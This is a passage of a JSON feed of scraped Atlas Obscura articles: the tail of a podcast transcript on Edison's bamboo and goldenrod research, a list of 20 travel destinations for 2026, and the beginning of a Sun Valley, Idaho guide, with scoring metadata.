href=\"https://go.skimresources.com/?id=89027X1542228&amp;isjs=1&amp;jv=15.7.1&amp;sref=https%3A%2F%2Fwww.atlasobscura.com%2Farticles%2Fpodcast-montezuma-well&amp;url=https%3A%2F%2Fpodcasts.apple.com%2Fus%2Fpodcast%2Fthe-atlas-obscura-podcast%2Fid1555769970&amp;xs=1&amp;xtz=300&amp;xuuid=f238828fc9c8f1386593b6f8b1d81e7b&amp;xjsf=other_click__contextmenu%20%5B2%5D\"><em>Apple Podcasts</em></a><em>, </em><a href=\"https://open.spotify.com/show/0s0c4Z99PwbW8efTmHckyT\"><em>Spotify</em></a><em>, and all major podcast apps.</em></p>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106299/image.jpg\" width=\"auto\" /></figure>\n<p><strong>Kelly: </strong>Plants were actually the reason Thomas Edison had fallen in love with Fort Myers in the first place. Around 30 years before that camping trip with Ford, Edison was working away in his Menlo Park lab on one of his most famous projects.</p>\n<p><strong>Karen Maxwell:</strong> Many people are under the misimpression he invented the light bulb. He actually perfected it.</p>\n<p><strong>Kelly: </strong>This is Karen Maxwell. She’s the horticulture director at the Edison and Ford Winter Estates.</p>\n<p><strong>Karen: </strong>So, at this time, there are about 20 different varieties of incandescent light bulbs, but none of them burned for very long.</p>\n<p><strong>Kelly:</strong> The problem was this teeny tiny piece inside the bulb called a filament. When electricity passes through, the filament heats up and glows and we get light. But none of these early filaments could glow long enough to make a practical light bulb.</p>\n<p>So Edison set out to change that, testing thousands and thousands of different materials. Cotton, platinum, cedar, and finally, bamboo.</p>\n<p><strong>Karen: </strong>And he had his team—I’m glad I wasn’t one of them then—they stayed up and did shifts to record how long it burned. That filament burned for 1,200 hours. And that made the incandescent light bulb a national product.</p>\n<p><strong>Kelly:</strong> Edison, already a famous inventor, was now a legend. But by the end of the project, his personal life was a mess.</p>\n<p><strong>Karen:</strong> He was 38 years old, burned out, and had lost his first wife, Mary. Three children. His doctor says, Thomas, you need to go south, take a vacation, and take a break. He ends up arriving in St. Augustine during the winter and finds that is really too cold. It didn’t meet what his doctor had prescribed. So one of his friends takes him further down the river and they end up going by the property, which is currently today what we know as the Edison and Ford Winter Estates. What does he see but stands of bamboo growing along the riverside? He bought it on the spot.</p>\n<p><strong>Kelly:</strong> Edison remarried, and soon he and his second wife, Mina, started transforming the Florida property and its stand of bamboo into their wintertime home away from home. Edison even had an old laboratory shipped down from New Jersey in case inspiration struck while he was on vacation. You know, his lab away from lab.</p>\n<p>At first, he did some experimenting with bamboo, but then in 1905, the invention of the tungsten filament for the light bulb made the bamboo one obsolete. Soon enough, though, he would have another project to focus on.</p>\n<p>After the Fords joined the Edison family vacation in 1914, it was time for Ford to invite Edison on a trip. They went to San Francisco, and Ford introduced Edison to some friends: a botanist named Luther Burbank, who was interested in plant hybridization, and the tire magnate, Harvey Firestone, of Firestone Tires. It wasn’t long before their conversation turned to rubber.</p>\n<p>And the thing was, in order to make cars, you needed tires, and in order to make tires, you needed rubber. Back then, there was no such thing as synthetic rubber. All of it came from plants. Most natural rubber was grown in Southeast Asia, in British and Dutch colonies, and that meant the British and Dutch set rubber prices. The crew became convinced that America needed its own domestic rubber supply. Edison got to work right away.</p>\n<p><strong>Karen:</strong> So he starts looking for a product that can grow quickly, produce latex. Latex is what makes rubber. Latex is a milky white substance. If you break open the stem, out comes a sticky white milky product. That is latex and that is the basis of all natural rubber.</p>\n<p>Over 17,000 plants are brought in and studied. There were botanists, volunteers, they even engaged the Union Pacific Railroad, who instructed every section chief to collect any plants growing along their extensive miles of right-of-way and forward them to Edison’s laboratory.</p>\n<p><strong>Kelly:</strong> The Florida House essentially became a latex distilling factory. Today, if you visit, you can still see a lot of these plants that Edison was experimenting on. There’s a spiny vine called crown of thorns, which looks like a cactus; a scrubby desert shrub called guayule, which is native to Mexico; and the most spectacular specimen, or at least the biggest, was the banyan tree.</p>\n<p><strong>Karen:</strong> It’s been in place for 100 years. And over the years, it’s grown extensively. We’ve had to maintain trimming so it doesn’t just eat up the buildings. The first impression people have is they’re looking at a forest of trees.</p>\n<p><strong>Kelly</strong>: Today, the tree covers nearly an entire acre of land. It’s the largest banyan tree in the continental U.S. But unfortunately for Edison, it just did not produce enough latex.</p>\n<p><strong>Karen:</strong> In 1928, he discovers, right here in his backyard, the plant that produces the most latex is goldenrod.</p>\n<p><strong>Kelly: </strong>Goldenrod is a very fast-growing weed with yellow flowers. Looks a lot like ragweed. So Edison ripped out rows and rows of his wife Mina’s citrus trees to plant goldenrod, which I’m sure she wasn’t thrilled about.</p>\n<p><strong>Karen:</strong> He mows them all down and he transforms their estate-like atmosphere to just a conglomeration of disorderly beds with markers and irrigation ditches all around, 500 plots of yellow goldenrod. And as you can imagine, that did little to kindle her enthusiasm for his work.</p>\n<p><strong>Kelly:</strong> Speaking of Mina’s view of his work, she was annoyed about the citrus trees, yes, but she was also worried about her husband’s health. Edison was in his 80s now and still keeping pretty long hours.</p>\n<p>Mina wrote, “He thinks of nothing else now. He has no time for anything else, no recreation,” and, “Everything turned to rubber in the family. We talked rubber, thought rubber, dreamed rubber.”</p>\n<p>There was also some tension between her and Henry Ford. For one thing, Ford had bought the house right next door. That’s why the museum today is known as the Edison and Ford Estates. And another thing: Ford had convinced Edison to let him dismantle his Florida lab and ship it up to Michigan. Because Ford wanted to start a museum dedicated to American innovation, and he said he simply needed his hero’s lab. Mina was not too happy about this. Though, with the help of Ford and Firestone, Edison did end up building a brand new botanical lab.</p>\n<p>Still, by the end of the 1920s, Edison’s health got worse. He came down with pneumonia and by the fall of 1931 was bedridden in New Jersey. At one point on his deathbed, as he was slipping in and out of consciousness, someone came in with a package sent from the Florida house.</p>\n<p>Inside was a small piece of rubber made from Edison’s goldenrod plants. According to biographer Michele Albion, he had a moment of lucidity, and then sunk into a coma. Just a few days later, he died on October 18th, 1931. The Edison family kept the botanical research lab going until 1934, when it was transferred over to the Department of Agriculture.</p>\n<p><strong>Karen:</strong> But it turned out his vision of the importance became true because when World War II came about, Japan captured Malaysia, Singapore, and most of the Pacific Rim rubber plantations.</p>\n<p><strong>Kelly: </strong>During the war, there were serious rubber shortages in the U.S. The government rationed gasoline and lowered speed limits just to make tires last longer.</p>\n<p><strong>Karen:</strong> But it was shortly after that that synthetic rubber ended the goldenrod destiny. That was in 1944. And It was pretty much what Tungsten did for his carbonized bamboo filament, the synthetic rubber did to his goldenrod rubber research. But he was right. I mean, he kept people going in the right direction. Without that foundation, we probably wouldn’t have been here today.</p>\n<p><strong>Kelly: </strong>Today, the Ford and Edison Winter Estates are combined into one big museum property. You can spend hours wandering around the grounds and seeing many of the plants that we talked about in this episode. The bamboo, the goldenrod, the banyan tree, and of course, the botanical laboratory itself.</p>\n<p><strong>Karen: </strong>It’s a 21-acre paradise of discovery for people that enjoy gardens and enjoy the different textures, the structures, the colors. There’s something blooming every single day. Many, many things.</p>\n<p><strong>Kelly:</strong> In our episode description, we will post a link to more info about visiting the Edison and Ford winter estates. And if you enjoyed today’s show, check out another episode of ours called <a href=\"https://www.atlasobscura.com/articles/podcast-fordlandia\">Fordlandia</a>. It’s all about Henry Ford’s very unsuccessful attempt to start an industrial rubber town in Brazil.</p>\n<p><strong><em>Listen and subscribe on</em></strong><a href=\"https://podcasts.apple.com/us/podcast/the-atlas-obscura-podcast/id1555769970\"> <strong><em>Apple Podcasts</em></strong></a><strong><em>,</em></strong><a href=\"https://open.spotify.com/show/0s0c4Z99PwbW8efTmHckyT\"> <strong><em>Spotify</em></strong></a><strong><em>, and all major podcast apps.</em></strong></p>\n<p><em>Our podcast is a co-production of Atlas Obscura and Sirius XM Podcasts. This episode was produced by Amanda McGowan. The production team for this episode includes Dylan Thuras, Doug Baldinger, Kameel Stanley, Johanna Mayer, Manolo Morales, Jerome Campbell, Amanda McGowan, Alexa Lim, Casey Holford, and Luz Fleming. Our theme music is by Sam Tyndall.</em></p>",
        "source": "www.atlasobscura.com",
        "published": "Wed, 28 Jan 2026 17:15:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475496Z",
        "tags": [
          {
            "name": "transformation",
            "score": 3
          },
          {
            "name": "boundary_crossing",
            "score": 6
          },
          {
            "name": "scale_shift",
            "score": 8
          }
        ],
        "structural_score": 17,
        "timeliness_score": 3,
        "final_score": 10.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.atlasobscura.com/articles/20-places-to-travel-and-transform-yourself-in-2026-from-atlas-obscura",
        "title": "20 Places to Travel and Transform Yourself in 2026, from Atlas Obscura",
        "summary": "<p>Looking for your next adventure? These 20 extraordinary destinations might just change how you see the world in 2026. Each place on this list asks something of you—patience, curiosity, humility, wonder—and gives something back in return. They’re not just trips; they’re invitations to travel differently, and to come home changed.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>1.</strong><a href=\"https://www.atlasobscura.com/places/fes-el-bali\"> <strong>Fes el-Bali in Fez, </strong>Morocco</a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106235/image.jpg\" width=\"auto\" /></figure>\n<p>Step through the<a href=\"https://www.atlasobscura.com/places/the-blue-gate-of-fes-fez-morocco\"> Blue Gate</a> into the world's largest car-free medieval city—9,400 winding alleyways where 150,000 people live as their ancestors did. Getting lost among leather tanneries and spice souks forces you to surrender control and trust strangers, a reminder that not everything worth finding can be Googled.</p>\n<p><strong>Best time to visit:</strong> March-May or September-November for mild temperatures</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>2.</strong><a href=\"https://www.atlasobscura.com/places/waitomo-glowworm-caves\"> <strong>Glowworm Caves in Waitomo, New Zealand</strong></a></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106238/image.jpg\" width=\"auto\" /></figure>\n<p>Float silently through pitch-black caves beneath thousands of bioluminescent larvae creating nature's own planetarium. The <a href=\"https://www.atlasobscura.com/articles/video-wonder-new-zealands-twinkling-glowworm-caves\">boat journey</a> requires complete silence—no talking, no cameras. In our age of constant documentation, experiencing something you can't immediately share teaches you that some moments are meant to be felt, not captured.</p>\n<p><strong>Best time to visit:</strong> December-March (summer) for warmer weather above ground.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>3.</strong><a href=\"https://www.atlasobscura.com/places/kallur-lighthouse\"> Kallur Lighthouse in Kalsoy, <strong>Faroe Islands, Kingdom of Denmark</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106233/image.jpg\" width=\"auto\" /></figure>\n<p>Eighteen volcanic islands with dramatic cliffs,<a href=\"https://www.atlasobscura.com/places/gasadalur-village-2\"> grass-roofed villages</a>, and more sheep than people. Hike to Kallur Lighthouse or photograph Múlafossur waterfall cascading into the ocean. Weather changes every hour—all four seasons in a single day.</p>\n<p><strong>Best time to visit:</strong> June-July for longest days and accessible trails.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>4.</strong><a href=\"https://www.atlasobscura.com/places/cappadocia\"> <strong>Cappadocia in Aksaray, Turkey</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106232/image.jpg\" width=\"auto\" /></figure>\n<p><br />Volcanic eruptions created fairy chimneys, hidden<a href=\"https://www.atlasobscura.com/places/derinkuyu-underground-city\"> cave churches with Byzantine frescoes, and underground cities</a>. One such city was even <a href=\"https://www.atlasobscura.com/articles/derinkuyu-turkey-underground-city-strange-maps\">discovered by a local resident</a> during a home renovation project. Take a hot air balloon ride at sunrise, explore the underground cities carved eight levels deep, or stay in a cave hotel.</p>\n<p><strong>Best time to visit:</strong> April-May or September-October for ideal balloon weather.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>5.</strong><a href=\"https://www.atlasobscura.com/places/into-the-glacier\"> Langjökull<strong> Glacier Ice Caves near Húsafell, Iceland</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106231/image.jpg\" width=\"auto\" /></figure>\n<p>November through March, Iceland's glaciers reveal crystalline caves in impossible shades of blue. Because ice constantly melts and refreezes, you never see the same cave twice—each visit is literally once-in-human-history.</p>\n<p><strong>Best time to visit:</strong> January-February for most dramatic ice formations.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>6.</strong><a href=\"https://www.atlasobscura.com/places/petra\"> <strong>Petra, Jordan</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106230/image.jpg\" width=\"auto\" /></figure>\n<p>Walk through the narrow Siq canyon and emerge facing the Treasury—a 2,000-year-old facade carved into rose-red rock. This Nabataean city features hundreds of tombs and temples carved into sandstone. Climb to the Monastery or hike to <a class=\"underline underline underline-offset-2 decoration-1 decoration-current/40 hover:decoration-current focus:decoration-current\" href=\"https://www.atlasobscura.com/places/little-petra\">Little Petra</a> for solitude.</p>\n<p><strong>Best time to visit:</strong> March-May or September-November. Early morning light makes the sandstone glow.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>7.</strong><a href=\"https://www.atlasobscura.com/places/cerro-fitz-roy\"><strong> Cerro Fitz Roy in El Chaltén, Argentina</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106229/image.jpg\" width=\"auto\" /></figure>\n<p>The Patagonia logo mountain. This 3,405-meter granite spire offers saw-toothed peaks and glacial lakes in impossible turquoise. The trek to Laguna de Los Tres delivers sunrise views that turn granite into a golden shade of pink. If you want extra adventure and you have time to take your journey northward, start in El Chaltén and then journey to the small town of <a href=\"https://www.atlasobscura.com/articles/nahuelito-argentina-loch-ness-monster-bariloche-patagonia\">Bariloche</a>, where Argentina's own Loch Ness monster is rumored to live.</p>\n<p><strong>Best time to visit:</strong> December-February (summer) for most stable weather.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>8.</strong><a href=\"https://www.atlasobscura.com/places/bagan\"> <strong>Bagan in Nyaung-U, Myanmar</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106228/image.jpg\" width=\"auto\" /></figure>\n<p>Over 2,000 Buddhist temples and pagodas built between the 11th-13th centuries dot ancient plains. Rent an e-bike to explore, climb select temples for sunrise, or take a hot air balloon ride. Less crowded than Angkor Wat, equally impressive.</p>\n<p><strong>Best time to visit:</strong> November-February (cool, dry season) for comfortable exploration.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>9.</strong><a href=\"https://www.atlasobscura.com/places/salar-de-uyuni-bolivian-salt-flat\"> <strong>Uyuni Salt Flat in Daniel Campos, Bolivia</strong></a></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106239/image.jpg\" width=\"auto\" /></figure>\n<p>The world's largest salt flat—4,000 square miles of blinding white hexagons. During rainy season, thin water transforms it into the world's largest mirror, reflecting perfect sky. For more inspiration, check out these beautiful <a href=\"https://www.atlasobscura.com/articles/salt-flat-landscape-bolivia\">photos</a> and <a href=\"https://www.atlasobscura.com/articles/satellite-calibration-salar-de-uyuni\">satellite images</a>. Standing on these salt flats, where ground becomes sky and distance becomes meaningless, you understand that Earth still breaks every assumption about what's possible.</p>\n<p><strong>Best time to visit:</strong> December-April for mirror effect, May-October for hexagonal patterns.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>10.</strong><a href=\"https://www.atlasobscura.com/places/plitvi-ka-jezera-plitvice-lakes\"> <strong>Plitvice Lakes in Plitvička Jezera, Croatia</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106226/image.jpg\" width=\"auto\" /></figure>\n<p>Sixteen terraced lakes connected by waterfalls cascade through forested canyons in shifting shades of azure, green, and blue. Wooden walkways let you walk directly over crystal-clear waters.</p>\n<p><strong>Best time to visit:</strong> May-June or September for lush greenery and fewer crowds.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>11.</strong><a href=\"https://www.atlasobscura.com/places/jigokudani-park-japan\"> <strong>Jigokudani Monkey Park in Yamanouchi, Japan<br /></strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106225/image.jpg\" width=\"auto\" /></figure>\n<p>Wild Japanese macaques soak in natural hot springs with snow falling around them in \"Hell's Valley.\" They look <a href=\"https://www.atlasobscura.com/articles/welcome-to-the-monkey-park\">hilariously human</a>—eyes closed in contentment, grooming each other. A hike through snowy forest leads to nature's most charming spa.</p>\n<p><strong>Best time to visit:</strong> December-March when snow creates dramatic contrast.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>12. <a href=\"https://www.atlasobscura.com/categories/route-66\">Route 66, USA</a><br /></strong></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106224/image.jpg\" width=\"auto\" /></figure>\n<p>In 2026, the<a href=\"https://www.atlasobscura.com/articles/route-66-highlights\"> Mother Road</a> celebrates its 100th birthday. The 2,400-mile stretch from<a href=\"https://www.atlasobscura.com/places/beginning-end-historic-route-66-chicago\"> Chicago</a> to<a href=\"https://www.atlasobscura.com/places/route-66-end-trail\"> Santa Monica</a> retains vintage motels, neon signs, diners, and quirky attractions—pure Americana.</p>\n<p><strong>Best time to visit:</strong> April-May or September-October for mild weather across climate zones.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>13.</strong><a href=\"https://www.atlasobscura.com/places/root-bridges-cherrapungee\"> <strong>Root Bridges in Cherrapunji, India</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106223/image.jpg\" width=\"auto\" /></figure>\n<p>In one of Earth's wettest places, the <a href=\"https://www.atlasobscura.com/articles/living-root-bridges-india\">Khasi people - truly artisans - </a>grow bridges from rubber tree roots over 10-15 years. Some are 500+ years old and still strengthening. The double-decker bridge requires 3,000 steps but teaches that patience beats speed, that working with nature trumps dominating it, and the best solutions might take longer than a single lifetime.</p>\n<p><strong>Best time to visit:</strong> November-February (dry season) for safer paths.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>14.</strong><a href=\"https://www.atlasobscura.com/places/havasupai-falls\"> <strong>Havasupai Falls in Supai, Arizona, USA</strong></a></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106240/image.jpg\" width=\"auto\" /></figure>\n<p>Hidden in the Grand Canyon, waterfalls pour into pools so turquoise they don't look real. Calcium carbonate creates desert-meets-Caribbean waters. Requires 10-mile hike and advance permits from the Havasupai Tribe.</p>\n<p><strong>Best time to visit:</strong> March-May or September-October for mild temperatures.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>15.</strong><a href=\"https://www.atlasobscura.com/places/socotra-island\"> <strong>Socotra Island, Yemen</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106221/image.jpg\" width=\"auto\" /></figure>\n<p>Split from Africa millions of years ago, over a third of the plant species here exist nowhere else. Dragon's blood trees look like Dr. Seuss illustrations alongside desert roses and pink dunes. Standing among these otherworldly trees reminds you that isolation creates irreplaceable uniqueness worth protecting.</p>\n<p><strong>Best time to visit:</strong> November-March for comfortable temperatures.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>16.</strong> <a href=\"https://www.atlasobscura.com/things-to-do/hallstatt-austria\"><strong>Hallstatt, Austria</strong></a></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106236/image.jpg\" width=\"auto\" /></figure>\n<p>An Alpine village so picturesque that<a href=\"https://www.atlasobscura.com/places/hallstatt-china\"> a Chinese mining company built a replica</a> to bring some Europe into Asia. The original Hallstatt - in Austria - is well-worth a visit. It features<a href=\"https://www.atlasobscura.com/places/salzwelten\"> ancient salt mines</a> and the<a href=\"https://www.atlasobscura.com/places/hallstatt-charnel-house\"> Charnel House</a> with painted skulls. And... maybe you'll get to the Chinese one next.</p>\n<p><strong>Best time to visit:</strong> May-June or September for smaller crowds.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>17.</strong><a href=\"https://www.atlasobscura.com/places/ta-prohm\"> Ta Prohm near Siem Reap, Cambodia</a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106237/image.jpg\" width=\"auto\" /></figure>\n<p>This hidden temple near Angkor Wat is being slowly consumed by jungle. At Ta Prohm, massive tree roots cascade over 12th-century stone and <a href=\"https://www.atlasobscura.com/places/dinosaur-angkor-wat\">curious carvings</a> stir controversy. Nature's patient reclamation—neither destroying nor preserving, but transforming—teaches that endings and beginnings are often the same thing. What could be viewed as overgrown has become beauty.</p>\n<p><strong>Best time to visit:</strong> November-February (dry, cool season).</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>18.</strong><a href=\"https://www.atlasobscura.com/places/marble-caves-of-chile-chico\"> <strong>Marble Caves in Puerto Río Tranquilo, Chile</strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106218/image.jpg\" width=\"auto\" /></figure>\n<p>Six thousand years of water carved swirling marble caverns reflecting Lake General Carrera's turquoise water in otherworldly blue. Best explored by kayak.</p>\n<p><strong>Best time to visit:</strong> December-February when glacial melt intensifies the blue.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>19.</strong><a href=\"https://www.atlasobscura.com/places/eduard-bohlen-shipwreck\"> Eduard Bohlen Shipwreck in <strong>Skeleton Coast, Namibia<br /></strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106217/image.jpg\" width=\"auto\" /></figure>\n<p>Where the Namib Desert meets the Atlantic, rusted shipwrecks dot beaches alongside seal colonies and<a href=\"https://www.atlasobscura.com/articles/namibia-lions-hunt-seals\"> desert-adapted lions</a>. This coastline—where sailors once perished and wildlife now thrives—proves that what looks like desolation to some is home to others.</p>\n<p><strong>Best time to visit:</strong> May-October for wildlife viewing and cooler temperatures. And for adventure, you can even stay in a <a href=\"https://www.atlasobscura.com/places/shipwreck-lodge\">\"shipwreck.\"</a></p>\n<h2 class=\"article-subheading-pre-rd\"><strong>20.</strong><a href=\"https://www.atlasobscura.com/places/zhangye-national-geopark\"> <strong>Zhangye National Geopark in Zhangye Shi, China<br /></strong></a></h2>\n<figure class=\"  \"><img alt=\"article-image\" class=\"article-image  \" src=\"https://assets.atlasobscura.com/article_images/106216/image.jpg\" width=\"auto\" /></figure>\n<p>Rainbow mountains striped in red, yellow, orange, green, and blue—millions of years of mineral deposits creating nature's abstract painting. Best after it rains, when colors intensify.</p>\n<p><strong>Best time to visit:</strong> June-September for vibrant colors after summer rains.</p>\n<p> </p>\n<p>Each of these destinations offer more than photo opportunities—they're invitations to see where humans and nature have collided and created extraordinary things. They’re invitations to pause and reflect. They're invitations to change and grow.</p>\n<p>The world welcomes you for a transformative 2026. Let’s Go.</p>",
        "source": "www.atlasobscura.com",
        "published": "Mon, 29 Dec 2025 05:58:00 -0500",
        "fetched_at": "2026-02-09T23:34:22.475541Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "visibility_gain",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 4
          }
        ],
        "structural_score": 17,
        "timeliness_score": 3,
        "final_score": 10.0,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://www.atlasobscura.com/articles/idaho-sun-valley-fascinating-places",
        "title": "Atlas Obscura’s Guide to Sun Valley, Idaho’s Most Fascinating Places",
        "summary": "<p>From top to bottom, Sun Valley is full of surprises. Only in this fascinating pocket of central Idaho can you experience an annual heritage festival that parades thousands of sheep from the mountains to Main Street by day, then discover some of the darkest night skies in the world for mind-blowing star gazing.</p>\n<p>In between, you’ll relax in a botanical garden’s meditative nook, and visit the gravesite of one of the world’s most notable writers and explore a moon-like national park full of caves and lava flows. Enjoy this guide to 10 wonderful ways to start your Sun Valley adventure.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\">The Roundhouse</h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106296/image.jpg\" width=\"auto\" /></figure>\n<p>The Roundhouse, a staple of Sun Valley Resort since 1939, elevates any dining experience—literally. Located 7,700 feet above sea level on Bald Mountain, the restaurant has been a featured fine dining spot since 1939, and is open seasonally, December through March. The octagonal restaurant, featuring 46 windows, is only accessible only by gondola, and the sweeping views of the entire valley make the views as impressive as the menu. Inside oozes with a ski chalet-style, cozy ambiance, especially the four-sided fireplace. A popular starter, the Fondue For Two, comes with artisan bread, Granny Smith apples, grapes, and gherkins. You can also add specialty meats and vegetables for an extra charge. A Wagyu burger, lobster rolls, scallops, and elk Swedish meatballs all make the menu here.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\"><strong>Central Idaho Dark Sky Reserve</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106289/image.jpg\" width=\"auto\" /></figure>\n<p>Grab your tent and experience the awe-inspiring wonder of Central Idaho’s starry, night sky in the <a href=\"https://visitsunvalley.com/searching-for-sun-valley/the-dark-skies-of-sun-valley-id/\">Central Idaho Dark Sky Reserve</a>. One of the last remaining areas of this level of nighttime natural darkness in the world, the reserve encompasses just under 1,500 miles of public lands inside the Sawtooth National Forest. Certified by the International Dark Sky Association in 2017, and given its highest “gold tier” status, the reserve features an ultra-dark core, plus dark periphery that helps protect the central dark area. Meteor showers, lunar eclipses, spring equinox and the summer solstice are just a few of the many public viewing events held at the reserve annually. The protected wilderness areas under these dark skies are also home to a stunning array of wildlife, including bears, wolverines, elk, wolves, and sandhill cranes.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\"><strong>Trailing of the Sheep</strong> <strong>Festival</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106286/image.jpg\" width=\"auto\" /></figure>\n<p>Each fall, a woolly throng of sheep, roughly 1,200 in all, parade down the main street of Ketchum, Idaho, for the <a href=\"https://visitsunvalley.com/events/annual-trailing-of-the-sheep-festival/\">Trailing of the Sheep Festival</a>. The treasured annual event commemorates the time-honored migration of sheep from Idaho’s high mountain summer pastures to the warmer, grazing and lambing grounds found farther south. For five days, the community celebrates the history, culture, and traditions of the region’s longstanding sheep ranchers, which include Basques, Peruvians, and Scots. Signature events include lamb-centered culinary classes, woolmaking workshops, a heritage fair, and national sheepdog trials. The 2026 festival is October 7-11.</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\"><strong>Craters of the Moon National Monument and Preserve</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106287/image.jpg\" width=\"auto\" /></figure>\n<p>A trip to Central Idaho’s Snake River Plain is just about as close to the moon as most of us will ever get. Aptly described as “a weird and scenic landscape” by President Calvin Coolidge when he established the 750,000-acre federally protected site in 1924, the <a href=\"https://www.atlasobscura.com/places/craters-of-the-moon-national-monument-and-preserve\">Craters of the Moon National Monument and Preserve</a> features a vast, lunar-like landscape of lava flows, cinder cones, and sagebrush. The unique environment was created thousands of years ago by a series of major eruptions along the 52-mile stretch of deep cracks in the Earth’s crust called the Great Rift. For generations, the park has garnered attention and profound fascination, and the wild terrain even served as a training ground for Apollo astronauts in the 1960s. Today, explorers enjoy discovering the park’s many lava tube caves and trails, and viewing the impressive overlooks while driving along the 7-mile Loop Road. Nature lovers and photographers also flock to the park for its surprising diversity of birds and other wildlife, plus it’s a designated dark sky park.</p>\n<h2 class=\"article-subheading-pre-rd\"><strong>Sun Valley Museum of Art</strong></h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106293/image.jpg\" width=\"auto\" /></figure>\n<p>In downtown Ketchum, the <a href=\"https://visitsunvalley.com/to-do/sun-valley-museum-of-art/\">Sun Valley Museum of Art</a> is just one of the many ways to explore the rich culture of the region—off the slopes. Now an integral part of Sun Valley’s arts and culture community, this free museum opened in 1971 and has grown to feature works from greats like Andy Warhol to important pieces from local and regional artists. Equal parts museum and educational hub, the center also features interesting lecture series, live music, films, and hands-on art classes and workshops throughout the year. The exhibit, \"Hidden Gems: Idaho Collects,\" brings art held in private collections in the region into public view through February 28, 2026. The exhibit aims to illuminate the region's community through the art they make and collect</p>\n<h2 class=\"article-subheading-pre-rd\" style=\"text-align: left;\">Pioneer Saloon</h2>\n<figure class=\" contains-caption \"><img alt=\"article-image\" class=\"article-image with-structured-caption \" src=\"https://assets.atlasobscura.com/article_images/106285/image.jpg\" width=\"auto\" /></figure>\n<p>One part time capsule, one part fine dining, the Pioneer Saloon is a beloved go-to for Ketchum locals and visitors alike. Located on Main Street, and affectionately called “the Pio,” the <a href=\"https://visitsunvalley.com/dining-shopping/the-pioneer-saloon/\">Pioneer Saloon</a> opened in the 1940s as a casino, despite gambling being outlawed in Idaho. 